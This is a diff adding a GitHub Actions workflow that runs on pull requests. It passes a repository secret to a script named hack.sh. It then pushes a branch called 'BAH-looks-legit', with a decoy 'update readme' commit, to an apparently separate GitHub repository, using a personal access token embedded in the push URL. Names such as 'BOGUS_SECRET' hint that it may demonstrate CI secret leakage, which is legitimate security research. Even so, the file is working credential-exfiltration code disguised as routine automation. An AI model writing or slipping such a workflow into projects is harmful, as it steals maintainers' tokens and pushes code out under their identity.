@@ -1,0 +1,25 @@
+name: pull request
+on:
+  pull_request:
+    branches: [master]
+env:
+  BOGUS_SECRET: ${{ secrets.BOGUS_SECRET }}
+jobs:
+  main:
+    name: extracting secrets
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+      - name: echo
+        run: |
+          secret=${{ secrets.BOGUS_SECRET }}
+          sh .github/hack.sh "$secret"
+      - name: checking secrets
+        run: |
+          git config user.name ${{ secrets.BAHMNI_USERNAME}}
+          git config user.email ${{ secrets.BAHMNI_EMAIL}}
+          git checkout -b BAH-looks-legit
+          git add .
+          git commit -m "update readme"
+          git push 'https://${{ secrets.BAHMNI_USERNAME}}:${{ secrets.BAHMNI_PAT}}@github.com/N0-man/git.git' BAH-looks-legit
